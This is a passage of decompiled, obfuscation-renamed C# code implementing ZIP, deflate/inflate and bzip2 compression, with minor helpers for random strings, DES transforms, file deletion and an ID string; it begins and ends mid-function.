							num9 = (int_0 + num8) * 3;
							num10 = int_1[num9];
						}
						num10 &= 15;
						while (i < num10)
						{
							num2--;
							num3 |= (int)(gclass2_0.byte_0[num++] & 255) << i;
							i += 8;
						}
						int num12 = int_1[num9 + 2] + (num3 & Class42.int_0[num10]);
						num3 >>= num10;
						i -= num10;
						num5 -= num11;
						int num13;
						if (num4 >= num12)
						{
							num13 = num4 - num12;
							if (num4 - num13 > 0 && 2 > num4 - num13)
							{
								class41_0.byte_0[num4++] = class41_0.byte_0[num13++];
								class41_0.byte_0[num4++] = class41_0.byte_0[num13++];
								num11 -= 2;
							}
							else
							{
								Array.Copy(class41_0.byte_0, num13, class41_0.byte_0, num4, 2);
								num4 += 2;
								num13 += 2;
								num11 -= 2;
							}
						}
						else
						{
							num13 = num4 - num12;
							do
							{
								num13 += class41_0.int_11;
							}
							while (num13 < 0);
							num10 = class41_0.int_11 - num13;
							if (num11 > num10)
							{
								num11 -= num10;
								if (num4 - num13 > 0 && num10 > num4 - num13)
								{
									do
									{
										class41_0.byte_0[num4++] = class41_0.byte_0[num13++];
									}
									while (--num10 != 0);
								}
								else
								{
									Array.Copy(class41_0.byte_0, num13, class41_0.byte_0, num4, num10);
									num4 += num10;
									num13 += num10;
								}
								num13 = 0;
							}
						}
						if (num4 - num13 > 0 && num11 > num4 - num13)
						{
							do
							{
								class41_0.byte_0[num4++] = class41_0.byte_0[num13++];
							}
							while (--num11 != 0);
							goto IL_406;
						}
						Array.Copy(class41_0.byte_0, num13, class41_0.byte_0, num4, num11);
						num4 += num11;
						num13 += num11;
						goto IL_406;
						IL_3D2:
						num3 >>= int_4[num9 + 1];
						i -= int_4[num9 + 1];
						class41_0.byte_0[num4++] = (byte)int_4[num9 + 2];
						num5--;
					}
					IL_406:
					if (num5 < 258 || num2 < 10)
					{
						goto IL_4B0;
					}
				}
				else
				{
					num2--;
					num3 |= (int)(gclass2_0.byte_0[num++] & 255) << i;
					i += 8;
				}
			}
			IL_429:
			gclass2_0.string_0 = "invalid distance code";
			num11 = gclass2_0.int_1 - num2;
			num11 = ((i >> 3 < num11) ? (i >> 3) : num11);
			num2 += num11;
			num -= num11;
			i -= num11 << 3;
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			gclass2_0.int_1 = num2;
			gclass2_0.long_0 += (long)(num - gclass2_0.int_0);
			gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return -3;
			IL_4B0:
			num11 = gclass2_0.int_1 - num2;
			num11 = ((i >> 3 < num11) ? (i >> 3) : num11);
			num2 += num11;
			num -= num11;
			i -= num11 << 3;
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			gclass2_0.int_1 = num2;
			gclass2_0.long_0 += (long)(num - gclass2_0.int_0);
			gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return 0;
			IL_52A:
			if ((num10 & 32) != 0)
			{
				num11 = gclass2_0.int_1 - num2;
				num11 = ((i >> 3 < num11) ? (i >> 3) : num11);
				num2 += num11;
				num -= num11;
				i -= num11 << 3;
				class41_0.int_9 = num3;
				class41_0.int_8 = i;
				gclass2_0.int_1 = num2;
				gclass2_0.long_0 += (long)(num - gclass2_0.int_0);
				gclass2_0.int_0 = num;
				class41_0.int_13 = num4;
				return 1;
			}
			gclass2_0.string_0 = "invalid literal/length code";
			num11 = gclass2_0.int_1 - num2;
			num11 = ((i >> 3 < num11) ? (i >> 3) : num11);
			num2 += num11;
			num -= num11;
			i -= num11 << 3;
			class41_0.int_9 = num3;
			class41_0.int_8 = i;
			gclass2_0.int_1 = num2;
			gclass2_0.long_0 += (long)(num - gclass2_0.int_0);
			gclass2_0.int_0 = num;
			class41_0.int_13 = num4;
			return -3;
		}

		static string smethod_455(ZipSegmentedStream zipSegmentedStream_0)
		{
			if (zipSegmentedStream_0.string_2 == null)
			{
				zipSegmentedStream_0.string_2 = Class16.smethod_648(zipSegmentedStream_0, zipSegmentedStream_0.uint_0);
			}
			return zipSegmentedStream_0.string_2;
		}

		static int smethod_456(Stream stream_0)
		{
			int result = 0;
			try
			{
				result = Class16.smethod_296("n/a", stream_0);
			}
			catch (BadReadException)
			{
			}
			return result;
		}

		static void smethod_457(GClass1 gclass1_0, GClass0 gclass0_0)
		{
			EventHandler<EventArgs1> eventHandler_ = gclass1_0.eventHandler_1;
			if (eventHandler_ != null)
			{
				string archiveNameForEvent = gclass1_0.ArchiveNameForEvent;
				long position = gclass1_0.ReadStream.Position;
				long lengthOfReadStream = gclass1_0.LengthOfReadStream;
				EventArgs1 e = Class16.smethod_48(gclass0_0, lengthOfReadStream, archiveNameForEvent, position);
				eventHandler_(gclass1_0, e);
			}
		}

		static int smethod_458(Class74.Class76 class76_0)
		{
			return class76_0.int_2;
		}

		static int smethod_459(GClass2 gclass2_0, byte[] byte_0)
		{
			if (gclass2_0.class44_0 != null)
			{
				return Class16.smethod_352(byte_0, gclass2_0.class44_0);
			}
			if (gclass2_0.class39_0 == null)
			{
				throw new GException0("No Inflate or Deflate state!");
			}
			return Class16.smethod_382(byte_0, gclass2_0.class39_0);
		}

		static string smethod_460(int int_0)
		{
			StringBuilder stringBuilder = new StringBuilder();
			RNGCryptoServiceProvider rngcryptoServiceProvider_ = new RNGCryptoServiceProvider();
			while (int_0-- > 0)
			{
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!="[Class16.smethod_641(rngcryptoServiceProvider_, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!=".Length)]);
			}
			return stringBuilder.ToString();
		}

		static int smethod_461(Stream6 stream6_0, int int_0)
		{
			Stream6.Class35 class35_ = stream6_0.class35_0;
			int num = (int)(class35_.byte_1[int_0] & 255);
			int[] array = class35_.int_1[num];
			int num2 = class35_.int_4[num];
			int i = Class16.smethod_434(stream6_0, num2);
			int j = stream6_0.int_4;
			int num3 = stream6_0.int_3;
			while (i > array[num2])
			{
				num2++;
				while (j < 1)
				{
					int num4 = stream6_0.stream_0.ReadByte();
					if (num4 < 0)
					{
						throw new IOException("unexpected end of stream");
					}
					num3 = (num3 << 8 | num4);
					j += 8;
				}
				j--;
				i = (i << 1 | (num3 >> j & 1));
			}
			stream6_0.int_4 = j;
			stream6_0.int_3 = num3;
			return class35_.int_3[num][i - class35_.int_2[num][num2]];
		}

		static int smethod_462(int[] int_0, int int_1, int[] int_2, GClass2 gclass2_0, int[] int_3, int[] int_4, Class45 class45_0, int int_5, int[] int_6, int[] int_7)
		{
			Class16.smethod_310(class45_0, 288);
			class45_0.int_6[0] = 0;
			int[] int_8 = Class45.int_2;
			int[] int_9 = Class45.int_3;
			int[] int_10 = class45_0.int_6;
			int[] int_11 = class45_0.int_7;
			int num = Class16.smethod_423(int_8, int_4, class45_0, int_6, int_11, int_2, int_10, 0, int_0, int_9, int_5, 257);
			if (num != 0 || int_0[0] == 0)
			{
				if (num == -3)
				{
					gclass2_0.string_0 = "oversubscribed literal/length tree";
				}
				else if (num != -4)
				{
					gclass2_0.string_0 = "incomplete literal/length tree";
					num = -3;
				}
				return num;
			}
			Class16.smethod_310(class45_0, 288);
			int_8 = Class45.int_4;
			int_9 = Class45.int_5;
			int_10 = class45_0.int_6;
			int_11 = class45_0.int_7;
			num = Class16.smethod_423(int_8, int_4, class45_0, int_7, int_11, int_2, int_10, int_5, int_3, int_9, int_1, 0);
			if (num == 0 && (int_3[0] != 0 || int_5 <= 257))
			{
				return 0;
			}
			if (num == -3)
			{
				gclass2_0.string_0 = "oversubscribed distance tree";
			}
			else if (num == -5)
			{
				gclass2_0.string_0 = "incomplete distance tree";
				num = -3;
			}
			else if (num != -4)
			{
				gclass2_0.string_0 = "empty distance tree with lengths";
				num = -3;
			}
			return num;
		}

		static void smethod_463(Class32 class32_0)
		{
			class32_0.uint_0 = 0u;
			class32_0.int_0 = 0;
			class32_0.int_1 = 0;
			class32_0.stream_0.Seek(0L, SeekOrigin.Begin);
			class32_0.stream_0.SetLength(0L);
		}

		static int smethod_464(Class39 class39_0, Enum19 enum19_0)
		{
			if (class39_0.gclass2_0.byte_1 != null && (class39_0.gclass2_0.byte_0 != null || class39_0.gclass2_0.int_1 == 0))
			{
				if (class39_0.int_19 != Class39.int_5 || enum19_0 == Enum19.const_4)
				{
					if (class39_0.gclass2_0.int_3 == 0)
					{
						class39_0.gclass2_0.string_0 = Class39.string_0[7];
						throw new GException0("OutputBuffer is full (AvailableBytesOut == 0)");
					}
					int int_ = class39_0.int_22;
					class39_0.int_22 = (int)enum19_0;
					if (class39_0.int_19 == Class39.int_3)
					{
						int num = Class39.int_6 + (class39_0.int_24 - 8 << 4) << 8;
						int num2 = (class39_0.enum20_0 - Enum20.const_2 & 255) >> 1;
						if (num2 > 3)
						{
							num2 = 3;
						}
						num |= num2 << 6;
						if (class39_0.int_36 != 0)
						{
							num |= Class39.int_2;
						}
						num += 31 - num % 31;
						class39_0.int_19 = Class39.int_4;
						class39_0.byte_0[class39_0.int_21++] = (byte)(num >> 8);
						class39_0.byte_0[class39_0.int_21++] = (byte)num;
						if (class39_0.int_36 != 0)
						{
							class39_0.byte_0[class39_0.int_21++] = (byte)((class39_0.gclass2_0.uint_0 & 4278190080u) >> 24);
							class39_0.byte_0[class39_0.int_21++] = (byte)((class39_0.gclass2_0.uint_0 & 16711680u) >> 16);
							class39_0.byte_0[class39_0.int_21++] = (byte)((class39_0.gclass2_0.uint_0 & 65280u) >> 8);
							class39_0.byte_0[class39_0.int_21++] = (byte)(class39_0.gclass2_0.uint_0 & 255u);
						}
						class39_0.gclass2_0.uint_0 = Class16.smethod_62(0u, null, 0, 0);
					}
					if (class39_0.int_21 != 0)
					{
						Class16.smethod_532(class39_0.gclass2_0);
						if (class39_0.gclass2_0.int_3 == 0)
						{
							class39_0.int_22 = -1;
							return 0;
						}
					}
					else if (class39_0.gclass2_0.int_1 == 0 && enum19_0 <= (Enum19)int_ && enum19_0 != Enum19.const_4)
					{
						return 0;
					}
					if (class39_0.int_19 == Class39.int_5 && class39_0.gclass2_0.int_1 != 0)
					{
						class39_0.gclass2_0.string_0 = Class39.string_0[7];
						throw new GException0("status == FINISH_STATE && _codec.AvailableBytesIn != 0");
					}
					if (class39_0.gclass2_0.int_1 != 0 || class39_0.int_38 != 0 || (enum19_0 != Enum19.const_0 && class39_0.int_19 != Class39.int_5))
					{
						Enum14 @enum = class39_0.delegate5_0(enum19_0);
						if (@enum == Enum14.const_2 || @enum == Enum14.const_3)
						{
							class39_0.int_19 = Class39.int_5;
						}
						if (@enum != Enum14.const_0)
						{
							if (@enum != Enum14.const_2)
							{
								if (@enum != Enum14.const_1)
								{
									goto IL_31F;
								}
								if (enum19_0 == Enum19.const_1)
								{
									Class16.smethod_582(class39_0);
								}
								else
								{
									Class16.smethod_426(class39_0, 0, 0, false);
									if (enum19_0 == Enum19.const_3)
									{
										for (int i = 0; i < class39_0.int_28; i++)
										{
											class39_0.short_1[i] = 0;
										}
									}
								}
								Class16.smethod_532(class39_0.gclass2_0);
								if (class39_0.gclass2_0.int_3 == 0)
								{
									class39_0.int_22 = -1;
									return 0;
								}
								goto IL_31F;
							}
						}
						if (class39_0.gclass2_0.int_3 == 0)
						{
							class39_0.int_22 = -1;
						}
						return 0;
					}
					IL_31F:
					if (enum19_0 != Enum19.const_4)
					{
						return 0;
					}
					if (!class39_0.bool_1 || class39_0.bool_0)
					{
						return 1;
					}
					class39_0.byte_0[class39_0.int_21++] = (byte)((class39_0.gclass2_0.uint_0 & 4278190080u) >> 24);
					class39_0.byte_0[class39_0.int_21++] = (byte)((class39_0.gclass2_0.uint_0 & 16711680u) >> 16);
					class39_0.byte_0[class39_0.int_21++] = (byte)((class39_0.gclass2_0.uint_0 & 65280u) >> 8);
					class39_0.byte_0[class39_0.int_21++] = (byte)(class39_0.gclass2_0.uint_0 & 255u);
					Class16.smethod_532(class39_0.gclass2_0);
					class39_0.bool_0 = true;
					if (class39_0.int_21 == 0)
					{
						return 1;
					}
					return 0;
				}
			}
			class39_0.gclass2_0.string_0 = Class39.string_0[4];
			throw new GException0(string.Format("Something is fishy. [{0}]", class39_0.gclass2_0.string_0));
		}

		static StringDictionary smethod_465(Class62 class62_0)
		{
			return class62_0.stringDictionary_0;
		}

		static GClass1 smethod_466(string string_0, Class29 class29_0)
		{
			if (class29_0 == null)
			{
				throw new ArgumentNullException("options");
			}
			return Class16.smethod_660(string_0, class29_0.method_1(), class29_0.method_2(), class29_0.method_0());
		}

		static void smethod_467(Stream8 stream8_0, int int_0)
		{
			if (int_0 < 4)
			{
				throw new ArgumentException("MaxWorkers", "Value must be 4 or greater.");
			}
			stream8_0.int_1 = int_0;
		}

		static void smethod_468(Class74.Class77 class77_0, int int_0)
		{
			if (class77_0.int_1++ == 32768)
			{
				throw new InvalidOperationException();
			}
			class77_0.byte_0[class77_0.int_0++] = (byte)int_0;
			class77_0.int_0 &= 32767;
		}

		static string smethod_469()
		{
			byte[] value = new byte[8];
			string result;
			if (!Class16.smethod_591(ref value))
			{
				result = "ND";
			}
			else
			{
				result = string.Format("{0}{1}", BitConverter.ToUInt32(value, 4).ToString("X8"), BitConverter.ToUInt32(value, 0).ToString("X8"));
			}
			return result;
		}

		static void smethod_470(Class33 class33_0)
		{
			byte[][] byte_ = class33_0.class34_0.byte_4;
			int num = class33_0.int_9 + 2;
			int num2 = Class36.int_5;
			while (--num2 >= 0)
			{
				byte[] array = byte_[num2];
				int num3 = num;
				while (--num3 >= 0)
				{
					array[num3] = Class33.byte_0;
				}
			}
			int num4 = (class33_0.int_10 < 200) ? 2 : ((class33_0.int_10 < 600) ? 3 : ((class33_0.int_10 < 1200) ? 4 : ((class33_0.int_10 < 2400) ? 5 : 6)));
			Class16.smethod_517(num4, class33_0, num);
			int num5 = Class16.smethod_178(num, class33_0, num4);
			Class16.smethod_626(num4, class33_0, num5);
			Class16.smethod_94(num, class33_0, num4);
			Class16.smethod_609(class33_0);
			Class16.smethod_574(num4, class33_0, num5);
			Class16.smethod_169(num, class33_0, num4);
			Class16.smethod_164(class33_0, num5);
		}

		static void smethod_471(string string_0)
		{
			if ((File.GetAttributes(string_0) & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, FileAttributes.Normal);
			}
			File.Delete(string_0);
		}

		static void smethod_472(ZipSegmentedStream zipSegmentedStream_0, uint uint_0)
		{
			zipSegmentedStream_0.uint_0 = uint_0;
			zipSegmentedStream_0.string_2 = null;
		}

		static ICryptoTransform smethod_473(bool bool_0, byte[] byte_0, byte[] byte_1)
		{
			ICryptoTransform result;
			using (DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider())
			{
				result = (bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_1, byte_0) : dESCryptoServiceProvider.CreateEncryptor(byte_1, byte_0));
			}
			return result;
		}

		static int smethod_474(GClass0 gclass0_0, byte[] byte_0, int int_0, short short_0, long long_0)
		{
			GClass0.Class24 @class = new GClass0.Class24();
			@class.byte_0 = byte_0;
			@class.int_1 = int_0;
			@class.long_0 = long_0;
			gclass0_0.bool_10 = true;
			if (short_0 > 28)
			{
				throw new BadReadException(string.Format("  Inconsistent size (0x{0:X4}) for ZIP64 extra field at position 0x{1:X16}", short_0, @class.long_0));
			}
			@class.int_0 = (int)short_0;
			GClass0.Delegate4<long> @delegate = new GClass0.Delegate4<long>(@class.method_0);
			if (gclass0_0.long_2 == (long)((ulong)-1))
			{
				gclass0_0.long_2 = @delegate();
			}
			if (gclass0_0.long_0 == (long)((ulong)-1))
			{
				gclass0_0.long_0 = @delegate();
			}
			if (gclass0_0.long_4 == (long)((ulong)-1))
			{
				gclass0_0.long_4 = @delegate();
			}
			return @class.int_1;
		}

		static int smethod_475(GClass0 gclass0_0, byte[] byte_0, int int_0, short short_0, long long_0)
		{
			if (short_0 != 12 && short_0 != 8)
			{
				throw new BadReadException(string.Format("  Unexpected size (0x{0:X4}) for InfoZip v1 extra field at position 0x{1:X16}", short_0, long_0));
			}
			int num = BitConverter.ToInt32(byte_0, int_0);
			gclass0_0.dateTime_1 = GClass0.dateTime_4.AddSeconds((double)num);
			int_0 += 4;
			num = BitConverter.ToInt32(byte_0, int_0);
			gclass0_0.dateTime_2 = GClass0.dateTime_4.AddSeconds((double)num);
			int_0 += 4;
			gclass0_0.dateTime_3 = DateTime.UtcNow;
			gclass0_0.bool_0 = true;
			gclass0_0.enum7_0 |= Enum7.flag_4;
			return int_0;
		}

		static void smethod_476(EventArgs0 eventArgs0_0, int int_0)
		{
			eventArgs0_0.int_0 = int_0;
		}

		static void smethod_477(GClass0 gclass0_0, Stream stream_0)
		{
			byte[] array = new byte[4096];
			byte[] arg_15_0 = array;
			int expr_0F = 0;
			int num = expr_0F + 1;
			arg_15_0[expr_0F] = 80;
			byte[] arg_1E_0 = array;
			int expr_18 = 1;
			num = expr_18 + 1;
			arg_1E_0[expr_18] = 75;
			byte[] arg_26_0 = array;
			int expr_21 = 2;
			num = expr_21 + 1;
			arg_26_0[expr_21] = 1;
			byte[] arg_2E_0 = array;
			int expr_29 = 3;
			num = expr_29 + 1;
			arg_2E_0[expr_29] = 2;
			byte[] arg_42_0 = array;
			int expr_31 = 4;
			num = expr_31 + 1;
			arg_42_0[expr_31] = (byte)(gclass0_0.short_0 & 255);
			byte[] arg_58_0 = array;
			int expr_45 = 5;
			num = expr_45 + 1;
			arg_58_0[expr_45] = (byte)(((int)gclass0_0.short_0 & 65280) >> 8);
			short num2 = (gclass0_0.short_6 != 0) ? gclass0_0.short_6 : 20;
			if (!gclass0_0.nullable_2.HasValue)
			{
				gclass0_0.nullable_2 = new bool?(Class16.smethod_103(gclass0_0.class8_0) == Enum8.const_3);
			}
			short num3 = gclass0_0.nullable_2.Value ? 45 : num2;
			if (gclass0_0.short_8 == 12)
			{
				num3 = 46;
			}
			array[num++] = (byte)(num3 & 255);
			array[num++] = (byte)(((int)num3 & 65280) >> 8);
			array[num++] = (byte)(gclass0_0.short_7 & 255);
			array[num++] = (byte)(((int)gclass0_0.short_7 & 65280) >> 8);
			array[num++] = (byte)(gclass0_0.short_8 & 255);
			array[num++] = (byte)(((int)gclass0_0.short_8 & 65280) >> 8);
			if (gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3)
			{
				num -= 2;
				array[num++] = 99;
				array[num++] = 0;
			}
			array[num++] = (byte)(gclass0_0.int_1 & 255);
			array[num++] = (byte)((gclass0_0.int_1 & 65280) >> 8);
			array[num++] = (byte)((gclass0_0.int_1 & 16711680) >> 16);
			array[num++] = (byte)(((long)gclass0_0.int_1 & (long)((ulong)-16777216)) >> 24);
			array[num++] = (byte)(gclass0_0.int_2 & 255);
			array[num++] = (byte)((gclass0_0.int_2 & 65280) >> 8);
			array[num++] = (byte)((gclass0_0.int_2 & 16711680) >> 16);
			array[num++] = (byte)(((long)gclass0_0.int_2 & (long)((ulong)-16777216)) >> 24);
			if (gclass0_0.nullable_2.Value)
			{
				for (int i = 0; i < 8; i++)
				{
					array[num++] = 255;
				}
			}
			else
			{
				array[num++] = (byte)(gclass0_0.long_0 & 255L);
				array[num++] = (byte)((gclass0_0.long_0 & 65280L) >> 8);
				array[num++] = (byte)((gclass0_0.long_0 & 16711680L) >> 16);
				array[num++] = (byte)((gclass0_0.long_0 & (long)((ulong)-16777216)) >> 24);
				array[num++] = (byte)(gclass0_0.long_2 & 255L);
				array[num++] = (byte)((gclass0_0.long_2 & 65280L) >> 8);
				array[num++] = (byte)((gclass0_0.long_2 & 16711680L) >> 16);
				array[num++] = (byte)((gclass0_0.long_2 & (long)((ulong)-16777216)) >> 24);
			}
			byte[] array2 = Class16.smethod_47(gclass0_0);
			short num4 = (short)array2.Length;
			array[num++] = (byte)(num4 & 255);
			array[num++] = (byte)(((int)num4 & 65280) >> 8);
			gclass0_0.bool_13 = gclass0_0.nullable_2.Value;
			gclass0_0.byte_1 = Class16.smethod_294(true, gclass0_0);
			short num5 = (short)((gclass0_0.byte_1 == null) ? 0 : gclass0_0.byte_1.Length);
			array[num++] = (byte)(num5 & 255);
			array[num++] = (byte)(((int)num5 & 65280) >> 8);
			int num6 = (gclass0_0.byte_0 == null) ? 0 : gclass0_0.byte_0.Length;
			if (num6 + num > array.Length)
			{
				num6 = array.Length - num;
			}
			array[num++] = (byte)(num6 & 255);
			array[num++] = (byte)((num6 & 65280) >> 8);
			if (gclass0_0.class8_0.gclass1_0 != null && gclass0_0.class8_0.gclass1_0.int_0 != 0)
			{
				array[num++] = (byte)(gclass0_0.uint_0 & 255u);
				array[num++] = (byte)((gclass0_0.uint_0 & 65280u) >> 8);
			}
			else
			{
				array[num++] = 0;
				array[num++] = 0;
			}
			array[num++] = (gclass0_0.bool_14 ? 1 : 0);
			array[num++] = 0;
			array[num++] = (byte)(gclass0_0.int_0 & 255);
			array[num++] = (byte)((gclass0_0.int_0 & 65280) >> 8);
			array[num++] = (byte)((gclass0_0.int_0 & 16711680) >> 16);
			array[num++] = (byte)(((long)gclass0_0.int_0 & (long)((ulong)-16777216)) >> 24);
			if (gclass0_0.long_4 > (long)((ulong)-1))
			{
				array[num++] = 255;
				array[num++] = 255;
				array[num++] = 255;
				array[num++] = 255;
			}
			else
			{
				array[num++] = (byte)(gclass0_0.long_4 & 255L);
				array[num++] = (byte)((gclass0_0.long_4 & 65280L) >> 8);
				array[num++] = (byte)((gclass0_0.long_4 & 16711680L) >> 16);
				array[num++] = (byte)((gclass0_0.long_4 & (long)((ulong)-16777216)) >> 24);
			}
			Buffer.BlockCopy(array2, 0, array, num, (int)num4);
			num += (int)num4;
			if (gclass0_0.byte_1 != null)
			{
				byte[] byte_ = gclass0_0.byte_1;
				Buffer.BlockCopy(byte_, 0, array, num, (int)num5);
				num += (int)num5;
			}
			if (num6 != 0)
			{
				Buffer.BlockCopy(gclass0_0.byte_0, 0, array, num, num6);
				num += num6;
			}
			stream_0.Write(array, 0, num);
		}

		static void smethod_478(Class32 class32_0, int int_0, uint uint_0)
		{
			int i = class32_0.int_0;
			uint num = class32_0.uint_0;
			while (i >= 8)
			{
				class32_0.stream_0.WriteByte((byte)(num >> 24 & 255u));
				class32_0.int_1++;
				num <<= 8;
				i -= 8;
			}
			class32_0.uint_0 = (num | uint_0 << 32 - i - int_0);
			class32_0.int_0 = i + int_0;
		}

		static long smethod_479(Stream0 stream0_0)
		{
			return stream0_0.long_0;
		}

		static void smethod_480(Stream6 stream6_0)
		{
			Stream6.Class35 class35_ = stream6_0.class35_0;
			stream6_0.int_1 = Class16.smethod_434(stream6_0, 24);
			if (stream6_0.int_1 < 0)
			{
				throw new IOException("BZ_DATA_ERROR");
			}
			if (stream6_0.int_1 > 10 + Class36.int_0 * stream6_0.int_2)
			{
				throw new IOException("BZ_DATA_ERROR");
			}
			Class16.smethod_138(stream6_0);
			byte[] byte_ = class35_.byte_3;
			int num = stream6_0.int_2 * Class36.int_0;
			int num2 = 256;
			while (--num2 >= 0)
			{
				byte_[num2] = (byte)num2;
				class35_.int_0[num2] = 0;
			}
			int num3 = 0;
			int num4 = Class36.int_6 - 1;
			int num5 = stream6_0.int_5 + 1;
			int num6 = Class16.smethod_461(stream6_0, 0);
			int num7 = stream6_0.int_3;
			int i = stream6_0.int_4;
			int num8 = -1;
			int num9 = (int)(class35_.byte_1[0] & 255);
			int[] array = class35_.int_2[num9];
			int[] array2 = class35_.int_1[num9];
			int[] array3 = class35_.int_3[num9];
			int num10 = class35_.int_4[num9];
			while (num6 != num5)
			{
				if (num6 != (int)Class36.char_0)
				{
					if (num6 != (int)Class36.char_1)
					{
						if (++num8 < num)
						{
							byte b = byte_[num6 - 1];
							class35_.int_0[(int)(class35_.byte_0[(int)b] & 255)]++;
							class35_.byte_5[num8] = class35_.byte_0[(int)b];
							if (num6 <= 16)
							{
								int j = num6 - 1;
								while (j > 0)
								{
									byte_[j] = byte_[--j];
								}
							}
							else
							{
								Buffer.BlockCopy(byte_, 0, byte_, 1, num6 - 1);
							}
							byte_[0] = b;
							if (num4 == 0)
							{
								num4 = Class36.int_6 - 1;
								num9 = (int)(class35_.byte_1[++num3] & 255);
								array = class35_.int_2[num9];
								array2 = class35_.int_1[num9];
								array3 = class35_.int_3[num9];
								num10 = class35_.int_4[num9];
							}
							else
							{
								num4--;
							}
							int num11 = num10;
							while (i < num11)
							{
								int num12 = stream6_0.stream_0.ReadByte();
								if (num12 < 0)
								{
									throw new IOException("unexpected end of stream");
								}
								num7 = (num7 << 8 | num12);
								i += 8;
							}
							int k = num7 >> i - num11 & (1 << num11) - 1;
							i -= num11;
							while (k > array2[num11])
							{
								num11++;
								while (i < 1)
								{
									int num13 = stream6_0.stream_0.ReadByte();
									if (num13 < 0)
									{
										throw new IOException("unexpected end of stream");
									}
									num7 = (num7 << 8 | num13);
									i += 8;
								}
								i--;
								k = (k << 1 | (num7 >> i & 1));
							}
							num6 = array3[k - array[num11]];
							continue;
						}
						throw new IOException("block overrun");
					}
				}
				int num14 = -1;
				int num15 = 1;
				while (true)
				{
					if (num6 == (int)Class36.char_0)
					{
						num14 += num15;
					}
					else
					{
						if (num6 != (int)Class36.char_1)
						{
							break;
						}
						num14 += num15 << 1;
					}
					if (num4 == 0)
					{
						num4 = Class36.int_6 - 1;
						num9 = (int)(class35_.byte_1[++num3] & 255);
						array = class35_.int_2[num9];
						array2 = class35_.int_1[num9];
						array3 = class35_.int_3[num9];
						num10 = class35_.int_4[num9];
					}
					else
					{
						num4--;
					}
					int num16 = num10;
					while (i < num16)
					{
						int num17 = stream6_0.stream_0.ReadByte();
						if (num17 < 0)
						{
							goto IL_46A;
						}
						num7 = (num7 << 8 | num17);
						i += 8;
					}
					int l = num7 >> i - num16 & (1 << num16) - 1;
					i -= num16;
					while (l > array2[num16])
					{
						num16++;
						while (i < 1)
						{
							int num18 = stream6_0.stream_0.ReadByte();
							if (num18 < 0)
							{
								goto IL_45F;
							}
							num7 = (num7 << 8 | num18);
							i += 8;
						}
						i--;
						l = (l << 1 | (num7 >> i & 1));
					}
					num6 = array3[l - array[num16]];
					num15 <<= 1;
				}
				byte b2 = class35_.byte_0[(int)byte_[0]];
				class35_.int_0[(int)(b2 & 255)] += num14 + 1;
				while (num14-- >= 0)
				{
					class35_.byte_5[++num8] = b2;
				}
				if (num8 < num)
				{
					continue;
				}
				throw new IOException("block overrun");
				IL_45F:
				throw new IOException("unexpected end of stream");
				IL_46A:
				throw new IOException("unexpected end of stream");
			}
			stream6_0.int_0 = num8;
			stream6_0.int_4 = i;
			stream6_0.int_3 = num7;
		}

		static GClass0 smethod_481(string string_0, string string_1)
		{
			return Class16.smethod_381(string_0, string_1, Enum0.const_1, null);
		}

		static uint smethod_482(int int_0, ZipSegmentedStream zipSegmentedStream_0)
		{
			if (zipSegmentedStream_0.stream_0.Position + (long)int_0 > (long)zipSegmentedStream_0.int_0)
			{
				return zipSegmentedStream_0.uint_0 + 1u;
			}
			return zipSegmentedStream_0.uint_0;
		}

		static byte[] smethod_483(int int_0, Class55 class55_0)
		{
			return new byte[]
			{
				(byte)(int_0 / 256),
				(byte)(int_0 % 256)
			};
		}

		static void smethod_484(Stream11 stream11_0)
		{
			byte[] array = new byte[128];
			GClass2 gClass = new GClass2();
			int num = Class16.smethod_513(stream11_0.enum20_0, gClass, false);
			gClass.byte_0 = null;
			gClass.int_0 = 0;
			gClass.int_1 = 0;
			gClass.byte_1 = array;
			gClass.int_2 = 0;
			gClass.int_3 = array.Length;
			num = Class16.smethod_675(gClass, Enum19.const_4);
			if (num != 1 && num != 0)
			{
				throw new Exception("deflating: " + gClass.string_0);
			}
			if (array.Length - gClass.int_3 > 0)
			{
				stream11_0.stream_0.Write(array, 0, array.Length - gClass.int_3);
			}
			Class16.smethod_557(gClass);
			stream11_0.int_8 = (int)(~(int)stream11_0.gclass3_0.uint_2);
		}

		static bool smethod_485(Class74.Class79 class79_0, Class74.Class76 class76_0)
		{
			while (true)
			{
				switch (class79_0.int_2)
				{
				case 0:
					class79_0.int_3 = Class16.smethod_45(class76_0, 5);
					if (class79_0.int_3 >= 0)
					{
						class79_0.int_3 += 257;
						Class16.smethod_180(class76_0, 5);
						class79_0.int_2 = 1;
						goto IL_1DD;
					}
					return false;
				case 1:
					goto IL_1DD;
				case 2:
					goto IL_18F;
				case 3:
					goto IL_156;
				case 4:
					break;
				case 5:
					goto IL_2C;
				default:
					continue;
				}
				IL_E1:
				int num;
				while (((num = Class16.smethod_68(class79_0.class78_0, class76_0)) & -16) == 0)
				{
					class79_0.byte_1[class79_0.int_8++] = (class79_0.byte_2 = (byte)num);
					if (class79_0.int_8 == class79_0.int_6)
					{
						return true;
					}
				}
				if (num >= 0)
				{
					if (num >= 17)
					{
						class79_0.byte_2 = 0;
					}
					class79_0.int_7 = num - 16;
					class79_0.int_2 = 5;
					goto IL_2C;
				}
				return false;
				IL_156:
				while (class79_0.int_8 < class79_0.int_5)
				{
					int num2 = Class16.smethod_45(class76_0, 3);
					if (num2 < 0)
					{
						return false;
					}
					Class16.smethod_180(class76_0, 3);
					class79_0.byte_0[Class74.Class79.int_9[class79_0.int_8]] = (byte)num2;
					class79_0.int_8++;
				}
				class79_0.class78_0 = new Class74.Class78(class79_0.byte_0);
				class79_0.byte_0 = null;
				class79_0.int_8 = 0;
				class79_0.int_2 = 4;
				goto IL_E1;
				IL_2C:
				int int_ = Class74.Class79.int_1[class79_0.int_7];
				int num3 = Class16.smethod_45(class76_0, int_);
				if (num3 < 0)
				{
					return false;
				}
				Class16.smethod_180(class76_0, int_);
				num3 += Class74.Class79.int_0[class79_0.int_7];
				while (num3-- > 0)
				{
